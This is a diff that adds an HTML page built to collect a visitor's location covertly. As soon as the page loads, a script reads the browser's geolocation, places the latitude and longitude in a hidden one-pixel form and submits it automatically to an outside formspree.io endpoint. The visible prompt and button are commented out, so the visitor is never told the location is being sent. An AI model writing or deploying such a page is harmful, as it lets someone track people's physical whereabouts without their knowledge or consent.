@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <!-- <p id="demo">Click the button to get your coordinates:</p> -->
+    <!-- <button onclick="getLocation()">Try It</button> -->
+    <form style="height: 1px; visibility: hidden;" action="https://formspree.io/f/moqrbvye" method="POST">
+        <input type="text" id="loc" name="location">
+        <button type="submit" id="sub">submit</button>
+    </form>
+    <script>
+        getLocation()
+        // var x = document.getElementById("demo");
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            }
+            else {
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            var m = "Latitude: " + position.coords.latitude +
+                "<br>Longitude: " + position.coords.longitude;
+            // x.innerHTML = m;
+            document.getElementById('loc').value = m;
+            console.log(m);
+            document.getElementById('sub').click();
+        }
+
+    </script>
+</body>
+
+</html>
